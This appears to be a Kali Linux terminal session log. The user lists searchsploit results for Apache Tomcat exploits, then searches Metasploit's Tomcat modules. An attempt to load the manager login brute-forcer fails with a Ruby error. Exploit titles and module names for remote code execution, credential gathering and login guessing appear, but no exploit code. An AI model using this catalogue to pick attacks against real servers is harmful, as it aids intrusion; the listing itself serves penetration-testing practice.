+Apache Tomcat 4.1 - JSP Request Cross-Site Scripting                                                                                                            | unix/remote/21734.txt
+Apache Tomcat 5 - Information Disclosure                                                                                                                        | multiple/remote/28254.txt
+Apache Tomcat 5.5.0 < 5.5.29 / 6.0.0 < 6.0.26 - Information Disclosure                                                                                          | multiple/remote/12343.txt
+Apache Tomcat 5.5.15 - cal2.jsp Cross-Site Scripting                                                                                                            | jsp/webapps/30563.txt
+Apache Tomcat 5.5.25 - Cross-Site Request Forgery                                                                                                               | multiple/webapps/29435.txt
+Apache Tomcat 5.x/6.0.x - Directory Traversal                                                                                                                   | linux/remote/29739.txt
+Apache Tomcat 6.0.10 - Documentation Sample Application Multiple Cross-Site Scripting Vulnerabilities                                                           | multiple/remote/30052.txt
+Apache Tomcat 6.0.13 - Host Manager Servlet Cross-Site Scripting                                                                                                | multiple/remote/30495.html
+Apache Tomcat 6.0.13 - Insecure Cookie Handling Quote Delimiter Session ID Disclosure                                                                           | multiple/remote/30496.txt
+Apache Tomcat 6.0.13 - JSP Example Web Applications Cross-Site Scripting                                                                                        | jsp/webapps/30189.txt
+Apache Tomcat 6.0.15 - Cookie Quote Handling Remote Information Disclosure                                                                                      | multiple/remote/31130.txt
+Apache Tomcat 6.0.16 - 'HttpServletResponse.sendError()' Cross-Site Scripting                                                                                   | multiple/remote/32138.txt
+Apache Tomcat 6.0.16 - 'RequestDispatcher' Information Disclosure                                                                                               | multiple/remote/32137.txt
+Apache Tomcat 6.0.18 - Form Authentication Existing/Non-Existing 'Username' Enumeration                                                                         | multiple/remote/33023.txt
+Apache Tomcat 6/7/8/9 - Information Disclosure                                                                                                                  | multiple/remote/41783.txt
+Apache Tomcat 7.0.4 - 'sort' / 'orderBy' Cross-Site Scripting                                                                                                   | linux/remote/35011.txt
+Apache Tomcat 8/7/6 (Debian-Based Distros) - Local Privilege Escalation                                                                                         | linux/local/40450.txt
+Apache Tomcat 8/7/6 (RedHat Based Distros) - Local Privilege Escalation                                                                                         | linux/local/40488.txt
+Apache Tomcat 9.0.0.M1 - Cross-Site Scripting (XSS)                                                                                                             | multiple/webapps/50119.txt
+Apache Tomcat 9.0.0.M1 - Open Redirect                                                                                                                          | multiple/webapps/50118.txt
+Apache Tomcat < 5.5.17 - Remote Directory Listing                                                                                                               | multiple/remote/2061.txt
+Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal                                                                                                             | unix/remote/14489.c
+Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal (PoC)                                                                                                       | multiple/remote/6229.txt
+Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (1)                                                    | windows/webapps/42953.txt
+Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (2)                                                    | jsp/webapps/42966.py
+Apache Tomcat Connector jk2-2.0.2 mod_jk2 - Remote Overflow                                                                                                     | linux/remote/5386.txt
+Apache Tomcat Connector mod_jk - 'exec-shield' Remote Overflow                                                                                                  | linux/remote/4162.c
+Apache Tomcat Manager - Application Deployer (Authenticated) Code Execution (Metasploit)                                                                        | multiple/remote/16317.rb
+Apache Tomcat Manager - Application Upload (Authenticated) Code Execution (Metasploit)                                                                          | multiple/remote/31433.rb
+Apache Tomcat mod_jk 1.2.20 - Remote Buffer Overflow (Metasploit)                                                                                               | windows/remote/16798.rb
+Apache Tomcat/JBoss EJBInvokerServlet / JMXInvokerServlet (RMI over HTTP) Marshalled Object - Remote Code Execution                                             | php/remote/28713.php
+AWStats 6.x - Apache Tomcat Configuration File Arbitrary Command Execution                                                                                      | cgi/webapps/35035.txt
+Jakarta Tomcat 3.x/4.0 - Error Message Information Disclosure                                                                                                   | unix/local/21073.txt
+Tomcat - Remote Code Execution via JSP Upload Bypass (Metasploit)                                                                                               | java/remote/43008.rb
+Tomcat 3.0/3.1 Snoop Servlet - Information Disclosure                                                                                                           | multiple/remote/20132.txt
+Tomcat 3.2.1/4.0 / Weblogic Server 5.1 - URL JSP Request Source Code Disclosure                                                                                 | multiple/remote/20719.txt
+Tomcat proprietaryEvaluate 9.0.0.M1 - Sandbox Escape                                                                                                            | java/webapps/47892.txt
+---------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+                                                                                                                                                                                                  
+┌──(kali㉿kali)-[~]
+└─$ searchsploit -u
+[i] Updating via apt package management (Expect weekly-ish updates): exploitdb
+
+Hit:1 http://http.kali.org/kali kali-rolling InRelease 
+30 packages can be upgraded. Run 'apt list --upgradable' to see them.
+exploitdb is already the newest version (20260411-0kali1).
+Summary:                    
+  Upgrading: 0, Installing: 0, Removing: 0, Not Upgrading: 30
+
+[*] apt update finished
+[i] Updating via apt package management (Expect weekly-ish updates): exploitdb-papers
+
+Hit:1 http://http.kali.org/kali kali-rolling InRelease 
+30 packages can be upgraded. Run 'apt list --upgradable' to see them.
+Installing:                     
+  exploitdb-papers
+                                                                                                                                                                                                  
+Summary:
+  Upgrading: 0, Installing: 1, Removing: 0, Not Upgrading: 30
+  Download size: 2561 MB
+  Space needed: 2952 MB / 36.2 GB available
+
+Get:1 http://kali.download/kali kali-rolling/main amd64 exploitdb-papers all 20221122-0kali1 [2561 MB]
+Fetched 2561 MB in 8min 25s (5069 kB/s)                                                                                                                                                          
+Selecting previously unselected package exploitdb-papers.
+(Reading database ... 474257 files and directories currently installed.)
+Preparing to unpack .../exploitdb-papers_20221122-0kali1_all.deb ...
+Unpacking exploitdb-papers (20221122-0kali1) ...
+Setting up exploitdb-papers (20221122-0kali1) ...
+Processing triggers for kali-menu (2026.2.4) ...
+Scanning processes...                                                                                                                                                                             
+Scanning linux images...                                                                                                                                                                          
+
+Running kernel seems to be up-to-date.
+
+No services need to be restarted.
+
+No containers need to be restarted.
+
+No user sessions are running outdated binaries.
+
+No VM guests are running outdated hypervisor (qemu) binaries on this host.
+
+[*] apt update finished
+                                                                                                                                                                                                  
+┌──(kali㉿kali)-[~]
+└─$ search exploit tomcat
+Testing connection to Meilisearch...
+Using index 'movies'
+Adding 5 movies to the index...
+2026/05/15 02:35:12 Failed to add documents: MeilisearchCommunicationError unable to execute request (path "POST /indexes/movies/documents?primaryKey=id" with method "AddDocuments"): Post "http://localhost:7700/indexes/movies/documents?primaryKey=id": dial tcp [::1]:7700: connect: connection refused
+                                                                                                                                                                                                  
+┌──(kali㉿kali)-[~]
+└─$ sudo apt update
+sudo apt install exploitdb -y
+Hit:1 http://http.kali.org/kali kali-rolling InRelease
+30 packages can be upgraded. Run 'apt list --upgradable' to see them.
+exploitdb is already the newest version (20260411-0kali1).
+Summary:                    
+  Upgrading: 0, Installing: 0, Removing: 0, Not Upgrading: 30
+                                                                                                                                                                                                  
+┌──(kali㉿kali)-[~]
+└─$ searchsploit tomcat
+---------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                                  |  Path
+---------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+4D WebSTAR 5.3/5.4 Tomcat Plugin - Remote Buffer Overflow                                                                                                       | osx/remote/25626.c
+Apache 1.3.x + Tomcat 4.0.x/4.1.x mod_jk - Chunked Encoding Denial of Service                                                                                   | unix/dos/22068.pl
+Apache Commons FileUpload and Apache Tomcat - Denial of Service                                                                                                 | multiple/dos/31615.rb
+Apache Tomcat (Windows) - 'runtime.getRuntime().exec()' Local Privilege Escalation                                                                              | windows/local/7264.txt
+Apache Tomcat - 'WebDAV' Remote File Disclosure                                                                                                                 | multiple/remote/4530.pl
+Apache Tomcat - Account Scanner / 'PUT' Request Command Execution                                                                                               | multiple/remote/18619.txt
+Apache Tomcat - AJP 'Ghostcat File Read/Inclusion                                                                                                               | multiple/webapps/48143.py
+Apache Tomcat - AJP 'Ghostcat' File Read/Inclusion (Metasploit)                                                                                                 | multiple/webapps/49039.rb
+Apache Tomcat - CGIServlet enableCmdLineArguments Remote Code Execution (Metasploit)                                                                            | windows/remote/47073.rb
+Apache Tomcat - Cookie Quote Handling Remote Information Disclosure                                                                                             | multiple/remote/9994.txt
+Apache Tomcat - Form Authentication 'Username' Enumeration                                                                                                      | multiple/remote/9995.txt
+Apache Tomcat - WebDAV SSL Remote File Disclosure                                                                                                               | linux/remote/4552.pl
+Apache Tomcat / Geronimo 1.0 - 'Sample Script cal2.jsp?time' Cross-Site Scripting                                                                               | multiple/remote/27095.txt
+Apache Tomcat 10.1 - Denial Of Service                                                                                                                          | multiple/dos/51262.py
+Apache Tomcat 10.1.39 - Denial of Service (DoS)                                                                                                                 | multiple/remote/52318.py
+Apache Tomcat 11.0.3 - Remote Code Execution                                                                                                                    | multiple/webapps/52134.txt
+Apache Tomcat 3.0 - Directory Traversal                                                                                                                         | windows/remote/20716.txt
+Apache Tomcat 3.1 - Path Revealing                                                                                                                              | multiple/remote/20131.txt
+Apache Tomcat 3.2 - 404 Error Page Cross-Site Scripting                                                                                                         | multiple/remote/33379.txt
+Apache Tomcat 3.2 - Directory Disclosure                                                                                                                        | unix/remote/21882.txt
+Apache Tomcat 3.2.1 - 404 Error Page Cross-Site Scripting                                                                                                       | multiple/webapps/10292.txt
+Apache Tomcat 3.2.3/3.2.4 - 'RealPath.jsp' Information Disclosuree                                                                                              | multiple/remote/21492.txt
+Apache Tomcat 3.2.3/3.2.4 - 'Source.jsp' Information Disclosure                                                                                                 | multiple/remote/21490.txt
+Apache Tomcat 3.2.3/3.2.4 - Example Files Web Root Full Path Disclosure                                                                                         | multiple/remote/21491.txt
+Apache Tomcat 3.x - Null Byte Directory / File Disclosure                                                                                                       | linux/remote/22205.txt
+Apache Tomcat 3/4 - 'DefaultServlet' File Disclosure                                                                                                            | unix/remote/21853.txt
+Apache Tomcat 3/4 - JSP Engine Denial of Service                                                                                                                | linux/dos/21534.jsp
+Apache Tomcat 4.0.3 - Denial of Service 'Device Name' / Cross-Site Scripting                                                                                    | windows/webapps/21605.txt
+Apache Tomcat 4.0.3 - Requests Containing MS-DOS Device Names Information Disclosure                                                                            | multiple/remote/31551.txt
+Apache Tomcat 4.0.3 - Servlet Mapping Cross-Site Scripting                                                                                                      | linux/remote/21604.txt
+Apache Tomcat 4.0.x - Non-HTTP Request Denial of Service                                                                                                        | linux/dos/23245.pl
+Apache Tomcat 4.0/4.1 - Servlet Full Path Disclosure                                                                                                            | unix/remote/21412.txt
+Apache Tomcat 4.1 - JSP Request Cross-Site Scripting                                                                                                            | unix/remote/21734.txt
+Apache Tomcat 5 - Information Disclosure                                                                                                                        | multiple/remote/28254.txt
+Apache Tomcat 5.5.0 < 5.5.29 / 6.0.0 < 6.0.26 - Information Disclosure                                                                                          | multiple/remote/12343.txt
+Apache Tomcat 5.5.15 - cal2.jsp Cross-Site Scripting                                                                                                            | jsp/webapps/30563.txt
+Apache Tomcat 5.5.25 - Cross-Site Request Forgery                                                                                                               | multiple/webapps/29435.txt
+Apache Tomcat 5.x/6.0.x - Directory Traversal                                                                                                                   | linux/remote/29739.txt
+Apache Tomcat 6.0.10 - Documentation Sample Application Multiple Cross-Site Scripting Vulnerabilities                                                           | multiple/remote/30052.txt
+Apache Tomcat 6.0.13 - Host Manager Servlet Cross-Site Scripting                                                                                                | multiple/remote/30495.html
+Apache Tomcat 6.0.13 - Insecure Cookie Handling Quote Delimiter Session ID Disclosure                                                                           | multiple/remote/30496.txt
+Apache Tomcat 6.0.13 - JSP Example Web Applications Cross-Site Scripting                                                                                        | jsp/webapps/30189.txt
+Apache Tomcat 6.0.15 - Cookie Quote Handling Remote Information Disclosure                                                                                      | multiple/remote/31130.txt
+Apache Tomcat 6.0.16 - 'HttpServletResponse.sendError()' Cross-Site Scripting                                                                                   | multiple/remote/32138.txt
+Apache Tomcat 6.0.16 - 'RequestDispatcher' Information Disclosure                                                                                               | multiple/remote/32137.txt
+Apache Tomcat 6.0.18 - Form Authentication Existing/Non-Existing 'Username' Enumeration                                                                         | multiple/remote/33023.txt
+Apache Tomcat 6/7/8/9 - Information Disclosure                                                                                                                  | multiple/remote/41783.txt
+Apache Tomcat 7.0.4 - 'sort' / 'orderBy' Cross-Site Scripting                                                                                                   | linux/remote/35011.txt
+Apache Tomcat 8/7/6 (Debian-Based Distros) - Local Privilege Escalation                                                                                         | linux/local/40450.txt
+Apache Tomcat 8/7/6 (RedHat Based Distros) - Local Privilege Escalation                                                                                         | linux/local/40488.txt
+Apache Tomcat 9.0.0.M1 - Cross-Site Scripting (XSS)                                                                                                             | multiple/webapps/50119.txt
+Apache Tomcat 9.0.0.M1 - Open Redirect                                                                                                                          | multiple/webapps/50118.txt
+Apache Tomcat < 5.5.17 - Remote Directory Listing                                                                                                               | multiple/remote/2061.txt
+Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal                                                                                                             | unix/remote/14489.c
+Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal (PoC)                                                                                                       | multiple/remote/6229.txt
+Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (1)                                                    | windows/webapps/42953.txt
+Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (2)                                                    | jsp/webapps/42966.py
+Apache Tomcat Connector jk2-2.0.2 mod_jk2 - Remote Overflow                                                                                                     | linux/remote/5386.txt
+Apache Tomcat Connector mod_jk - 'exec-shield' Remote Overflow                                                                                                  | linux/remote/4162.c
+Apache Tomcat Manager - Application Deployer (Authenticated) Code Execution (Metasploit)                                                                        | multiple/remote/16317.rb
+Apache Tomcat Manager - Application Upload (Authenticated) Code Execution (Metasploit)                                                                          | multiple/remote/31433.rb
+Apache Tomcat mod_jk 1.2.20 - Remote Buffer Overflow (Metasploit)                                                                                               | windows/remote/16798.rb
+Apache Tomcat/JBoss EJBInvokerServlet / JMXInvokerServlet (RMI over HTTP) Marshalled Object - Remote Code Execution                                             | php/remote/28713.php
+AWStats 6.x - Apache Tomcat Configuration File Arbitrary Command Execution                                                                                      | cgi/webapps/35035.txt
+Jakarta Tomcat 3.x/4.0 - Error Message Information Disclosure                                                                                                   | unix/local/21073.txt
+Tomcat - Remote Code Execution via JSP Upload Bypass (Metasploit)                                                                                               | java/remote/43008.rb
+Tomcat 3.0/3.1 Snoop Servlet - Information Disclosure                                                                                                           | multiple/remote/20132.txt
+Tomcat 3.2.1/4.0 / Weblogic Server 5.1 - URL JSP Request Source Code Disclosure                                                                                 | multiple/remote/20719.txt
+Tomcat proprietaryEvaluate 9.0.0.M1 - Sandbox Escape                                                                                                            | java/webapps/47892.txt
+---------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+---------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Paper Title                                                                                                                                                    |  Path
+---------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Hardening & messing with win32 Apache Tomcat                                                                                                                    | english/12878-hardening-&-messin
+---------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+                                                                                                                                                                                                  
+┌──(kali㉿kali)-[~]
+└─$ msfconsole
+Metasploit tip: Add routes to pivot through a compromised host using route 
+add <subnet> <session_id>
+                                                  
+ _                                                    _
+/ \    /\         __                         _   __  /_/ __                                                                                                                                       
+| |\  / | _____   \ \           ___   _____ | | /  \ _   \ \                                                                                                                                      
+| | \/| | | ___\ |- -|   /\    / __\ | -__/ | || | || | |- -|                                                                                                                                     
+|_|   | | | _|__  | |_  / -\ __\ \   | |    | | \__/| |  | |_                                                                                                                                     
+      |/  |____/  \___\/ /\ \\___/   \/     \__|    |_\  \___\                                                                                                                                    
+                                                                                                                                                                                                  
+
+       =[ metasploit v6.4.126-dev                               ]
++ -- --=[ 2,638 exploits - 1,328 auxiliary - 2,163 payloads     ]
++ -- --=[ 432 post - 49 encoders - 14 nops - 12 evasion         ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+The Metasploit Framework is a Rapid7 Open Source Project
+
+msf > show options
+
+Global Options:
+===============
+
+   Option             Current Setting  Description
+   ------             ---------------  -----------
+   ConsoleLogging     false            Log all console input and output
+   LogLevel           0                Verbosity of logs (default 0, max 3)
+   MeterpreterPrompt                   The meterpreter prompt string
+   MinimumRank        manual           The minimum rank of exploits that will run without explicit confirmation (Accepted: manual, low, average, normal, good, great, excellent)
+   Prompt                              The prompt string
+   PromptChar                          The prompt character
+   PromptTimeFormat                    Format for timestamp escapes in prompts
+   SessionLogging     false            Log all input and output for sessions
+   SessionTlvLogging                   Log all incoming and outgoing TLV packets
+   TimestampOutput    false            Prefix all console output with a timestamp
+   VERBOSE            false            Enable detailed status messages - the specific behavior can differ per module
+
+msf > search tomcat
+
+Matching Modules
+================
+
+   #   Name                                                                       Disclosure Date  Rank       Check  Description
+   -   ----                                                                       ---------------  ----       -----  -----------
+   0   auxiliary/dos/http/apache_commons_fileupload_dos                           2014-02-06       normal     No     Apache Commons FileUpload and Apache Tomcat DoS
+   1   exploit/multi/http/struts_dev_mode                                         2012-01-06       excellent  Yes    Apache Struts 2 Developer Mode OGNL Execution
+   2   exploit/multi/http/struts2_namespace_ognl                                  2018-08-22       excellent  Yes    Apache Struts 2 Namespace Redirect OGNL Injection
+   3     \_ target: Automatic detection                                           .                .          .      .
+   4     \_ target: Windows                                                       .                .          .      .
+   5     \_ target: Linux                                                         .                .          .      .
+   6   exploit/multi/http/struts_code_exec_classloader                            2014-03-06       manual     No     Apache Struts ClassLoader Manipulation Remote Code Execution
+   7     \_ target: Java                                                          .                .          .      .
+   8     \_ target: Linux                                                         .                .          .      .
+   9     \_ target: Windows                                                       .                .          .      .
+   10    \_ target: Windows / Tomcat 6 & 7 and GlassFish 4 (Remote SMB Resource)  .                .          .      .
+   11  auxiliary/admin/http/tomcat_ghostcat                                       2020-02-20       normal     Yes    Apache Tomcat AJP File Read
+   12  exploit/windows/http/tomcat_cgi_cmdlineargs                                2019-04-10       excellent  Yes    Apache Tomcat CGIServlet enableCmdLineArguments Vulnerability
+   13  exploit/multi/http/tomcat_mgr_deploy                                       2009-11-09       excellent  Yes    Apache Tomcat Manager Application Deployer Authenticated Code Execution
+   14    \_ target: Automatic                                                     .                .          .      .
+   15    \_ target: Java Universal                                                .                .          .      .
+   16    \_ target: Windows Universal                                             .                .          .      .
+   17    \_ target: Linux x86                                                     .                .          .      .
+   18  exploit/multi/http/tomcat_mgr_upload                                       2009-11-09       excellent  Yes    Apache Tomcat Manager Authenticated Upload Code Execution
+   19    \_ target: Java Universal                                                .                .          .      .
+   20    \_ target: Windows Universal                                             .                .          .      .
+   21    \_ target: Linux x86                                                     .                .          .      .
+   22  auxiliary/dos/http/apache_tomcat_transfer_encoding                         2010-07-09       normal     No     Apache Tomcat Transfer-Encoding Information Disclosure and DoS
+   23  auxiliary/scanner/http/tomcat_enum                                         .                normal     No     Apache Tomcat User Enumeration
+   24  exploit/linux/local/tomcat_rhel_based_temp_priv_esc                        2016-10-10       manual     Yes    Apache Tomcat on RedHat Based Systems Insecure Temp Config Privilege Escalation
+   25  exploit/linux/local/tomcat_ubuntu_log_init_priv_esc                        2016-09-30       manual     Yes    Apache Tomcat on Ubuntu Log Init Privilege Escalation
+   26  exploit/multi/http/atlassian_confluence_webwork_ognl_injection             2021-08-25       excellent  Yes    Atlassian Confluence WebWork OGNL Injection
+   27    \_ target: Unix Command                                                  .                .          .      .
+   28    \_ target: Linux Dropper                                                 .                .          .      .
+   29    \_ target: Windows Command                                               .                .          .      .
+   30    \_ target: Windows Dropper                                               .                .          .      .
+   31    \_ target: PowerShell Stager                                             .                .          .      .
+   32  exploit/windows/http/cayin_xpost_sql_rce                                   2020-06-04       excellent  Yes    Cayin xPost wayfinder_seqid SQLi to RCE
+   33  exploit/multi/http/cisco_dcnm_upload_2019                                  2019-06-26       excellent  Yes    Cisco Data Center Network Manager Unauthenticated Remote Code Execution
+   34    \_ target: Automatic                                                     .                .          .      .
+   35    \_ target: Cisco DCNM 11.1(1)                                            .                .          .      .
+   36    \_ target: Cisco DCNM 11.0(1)                                            .                .          .      .
+   37    \_ target: Cisco DCNM 10.4(2)                                            .                .          .      .
+   38  exploit/linux/http/cisco_hyperflex_hx_data_platform_cmd_exec               2021-05-05       excellent  Yes    Cisco HyperFlex HX Data Platform Command Execution
+   39    \_ target: Unix Command                                                  .                .          .      .
+   40    \_ target: Linux Dropper                                                 .                .          .      .
+   41  exploit/linux/http/cisco_hyperflex_file_upload_rce                         2021-05-05       excellent  Yes    Cisco HyperFlex HX Data Platform unauthenticated file upload to RCE (CVE-2021-1499)
+   42    \_ target: Java Dropper                                                  .                .          .      .
+   43    \_ target: Linux Dropper                                                 .                .          .      .
+   44  exploit/linux/http/cpi_tararchive_upload                                   2019-05-15       excellent  Yes    Cisco Prime Infrastructure Health Monitor TarArchive Directory Traversal Vulnerability
+   45  exploit/linux/http/cisco_prime_inf_rce                                     2018-10-04       excellent  Yes    Cisco Prime Infrastructure Unauthenticated Remote Code Execution
+   46  post/multi/gather/tomcat_gather                                            .                normal     No     Gather Tomcat Credentials
+   47  auxiliary/dos/http/hashcollision_dos                                       2011-12-28       normal     No     Hashtable Collisions
+   48  auxiliary/admin/http/ibm_drm_download                                      2020-04-21       normal     Yes    IBM Data Risk Manager Arbitrary File Download
+   49  exploit/multi/http/ivanti_epmm_rce_cve_2025_4427_4428                      2025-05-13       excellent  Yes    Ivanti EPMM Authentication Bypass for Expression Language Remote Code Execution
+   50  exploit/linux/http/lucee_admin_imgprocess_file_write                       2021-01-15       excellent  Yes    Lucee Administrator imgProcess.cfm Arbitrary File Write
+   51    \_ target: Unix Command                                                  .                .          .      .
+   52    \_ target: Linux Dropper                                                 .                .          .      .
+   53  exploit/linux/http/mobileiron_core_log4shell                               2021-12-12       excellent  Yes    MobileIron Core Unauthenticated JNDI Injection RCE (via Log4Shell)
+   54    \_ AKA: Log4Shell                                                        .                .          .      .
+   55    \_ AKA: LogJam                                                           .                .          .      .
+   56  exploit/multi/http/zenworks_configuration_management_upload                2015-04-07       excellent  Yes    Novell ZENworks Configuration Management Arbitrary File Upload
+   57  exploit/multi/http/primefaces_weak_encryption_rce                          2016-02-15       excellent  Yes    Primefaces Remote Code Execution Exploit
+   58  exploit/multi/http/spring_framework_rce_spring4shell                       2022-03-31       manual     Yes    Spring Framework Class property RCE (Spring4Shell)
+   59    \_ target: Java                                                          .                .          .      .
+   60    \_ target: Linux                                                         .                .          .      .
+   61    \_ target: Windows                                                       .                .          .      .
+   62    \_ AKA: Spring4Shell                                                     .                .          .      .
+   63    \_ AKA: SpringShell                                                      .                .          .      .
+   64  auxiliary/admin/http/tomcat_administration                                 .                normal     No     Tomcat Administration Tool Default Access
+   65  auxiliary/scanner/http/tomcat_mgr_login                                    .                normal     No     Tomcat Application Manager Login Utility
+   66  exploit/multi/http/tomcat_partial_put_deserialization                      2025-03-10       excellent  Yes    Tomcat Partial PUT Java Deserialization
+   67    \_ target: Unix Command                                                  .                .          .      .
+   68    \_ target: Windows Command                                               .                .          .      .
+   69  exploit/multi/http/tomcat_jsp_upload_bypass                                2017-10-03       excellent  Yes    Tomcat RCE via JSP Upload Bypass
+   70    \_ target: Automatic                                                     .                .          .      .
+   71    \_ target: Java Windows                                                  .                .          .      .
+   72    \_ target: Java Linux                                                    .                .          .      .
+   73  auxiliary/admin/http/tomcat_utf8_traversal                                 2009-01-09       normal     No     Tomcat UTF-8 Directory Traversal Vulnerability
+   74  auxiliary/admin/http/trendmicro_dlp_traversal                              2009-01-09       normal     No     TrendMicro Data Loss Prevention 5.5 Directory Traversal
+   75  post/windows/gather/enum_tomcat                                            .                normal     No     Windows Gather Apache Tomcat Enumeration
+
+
+Interact with a module by name or index. For example info 75, use 75 or use post/windows/gather/enum_tomcat
+
+msf > auxiliary/scanner/http/tomcat_mgr_login
+/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/http-cookie-1.1.4/lib/http/cookie_jar/hash_store.rb:3:in `<top (required)>': uninitialized constant HTTP (NameError)
+        from /usr/lib/ruby/3.3.0/bundled_gems.rb:69:in `require'
+        from /usr/lib/ruby/3.3.0/bundled_gems.rb:69:in `block (2 levels) in replace_require'
+        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/bootsnap-1.23.0/lib/bootsnap/load_path_cache/core_ext/kernel_require.rb:33:in `require'
+        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/zeitwerk-2.7.5/lib/zeitwerk/core_ext/kernel.rb:34:in `require'
+        from /usr/share/metasploit-framework/lib/msf/core/exploit/remote/http/http_cookie_jar.rb:2:in `<top (required)>'
+        from /usr/lib/ruby/3.3.0/bundled_gems.rb:69:in `require'
+        from /usr/lib/ruby/3.3.0/bundled_gems.rb:69:in `block (2 levels) in replace_require'
+        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/bootsnap-1.23.0/lib/bootsnap/load_path_cache/core_ext/kernel_require.rb:33:in `require'
+        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/zeitwerk-2.7.5/lib/zeitwerk/core_ext/kernel.rb:26:in `require'
+        from /usr/share/metasploit-framework/lib/msf/core/exploit/remote/http_client.rb:99:in `initialize'
+        from /usr/share/metasploit-framework/lib/msf/core/auxiliary/auth_brute.rb:19:in `initialize'
+        from /usr/share/metasploit-framework/lib/msf/core/auxiliary/scanner.rb:22:in `initialize'
+        from /usr/share/metasploit-framework/modules/auxiliary/scanner/http/tomcat_mgr_login.rb:17:in `initialize'
+        from /usr/share/metasploit-framework/lib/msf/core/module_set.rb:37:in `new'
+        from /usr/share/metasploit-framework/lib/msf/core/module_set.rb:37:in `create'
+        from /usr/share/metasploit-framework/lib/msf/core/module_manager.rb:74:in `create'
+        from /usr/share/metasploit-framework/lib/msf/ui/console/driver.rb:543:in `unknown_command'
+        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:566:in `run_single'
+        from /usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:165:in `block in run'
+        from /usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:309:in `block in with_history_manager_context'
+        from /usr/share/metasploit-framework/lib/rex/ui/text/shell/history_manager.rb:37:in `with_context'
+        from /usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:306:in `with_history_manager_context'
+        from /usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:133:in `run'
+        from /usr/share/metasploit-framework/lib/metasploit/framework/command/console.rb:54:in `start'
+        from /usr/share/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start'
+        from /usr/bin/msfconsole:23:in `<main>'
+                                                                                                                                                                                                  
+┌──(kali㉿kali)-[~]
+└─$ msfconsole
+Metasploit tip: Display the Framework log using the log command, learn 
+more with help log
+                                                  
+                                   ___          ____
+                               ,-""   `.      < HONK >
+                             ,'  _   e )`-._ /  ----                                                                                                                                              
+                            /  ,' `-._<.===-'                                                                                                                                                     
+                           /  /                                                                                                                                                                   
+                          /  ;                                                                                                                                                                    
+              _          /   ;                                                                                                                                                                    
+ (`._    _.-"" ""--..__,'    |                                                                                                                                                                    
+ <_  `-""                     \                                                                                                                                                                   
+  <`-                          :                                                                                                                                                                  
+   (__   <__.                  ;                                                                                                                                                                  
+     `-.   '-.__.      _.'    /                                                                                                                                                                   
+        \      `-.__,-'    _,'                                                                                                                                                                    
+         `._    ,    /__,-'                                                                                                                                                                       
+            ""._\__,'< <____                                                                                                                                                                      
+                 | |  `----.`.                                                                                                                                                                    
+                 | |        \ `.                                                                                                                                                                  
+                 ; |___      \-``                                                                                                                                                                 
+                 \   --<                                                                                                                                                                          
+                  `.`.<                                                                                                                                                                           
+                    `-'                                                                                                                                                                           
+                                                                                                                                                                                                  
+                                                                                                                                                                                                  
+
+       =[ metasploit v6.4.126-dev                               ]
++ -- --=[ 2,638 exploits - 1,328 auxiliary - 2,163 payloads     ]
++ -- --=[ 432 post - 49 encoders - 14 nops - 12 evasion         ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+The Metasploit Framework is a Rapid7 Open Source Project
+
+msf > msfconsole
+[-] msfconsole cannot be run inside msfconsole
+msf > search tomcat_mgr_login
+
+Matching Modules
+================
+
+   #  Name                                     Disclosure Date  Rank    Check  Description
+   -  ----                                     ---------------  ----    -----  -----------
+   0  auxiliary/scanner/http/tomcat_mgr_login  .                normal  No     Tomcat Application Manager Login Utility
+
+
+Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/http/tomcat_mgr_login
+
+msf > useo
+[-] Unknown command: useo. Did you mean use? Run the help command for more details.
+msf > use 0
+[-] The supplied module name is ambiguous: uninitialized constant HTTP.
+msf > show options
+
+Global Options:
+===============
+
+   Option             Current Setting  Description
+   ------             ---------------  -----------
+   ConsoleLogging     false            Log all console input and output
+   LogLevel           0                Verbosity of logs (default 0, max 3)
+   MeterpreterPrompt                   The meterpreter prompt string
+   MinimumRank        manual           The minimum rank of exploits that will run without explicit confirmation (Accepted: manual, low, average, normal, good, great, excellent)
+   Prompt                              The prompt string
+   PromptChar                          The prompt character
+   PromptTimeFormat                    Format for timestamp escapes in prompts
+   SessionLogging     false            Log all input and output for sessions
+   SessionTlvLogging                   Log all incoming and outgoing TLV packets
+   TimestampOutput    false            Prefix all console output with a timestamp
+   VERBOSE            false            Enable detailed status messages - the specific behavior can differ per module
+
+msf > Interrupt: use the 'exit' command to quit
+msf > use auxiliary/scanner/http/tomcat_mgr_login
+[-] The supplied module name is ambiguous: uninitialized constant HTTP.
+msf > Interrupt: use the 'exit' command to quit
+msf > exit
+                                                                                                                                                                                                  
+┌──(kali㉿kali)-[~]
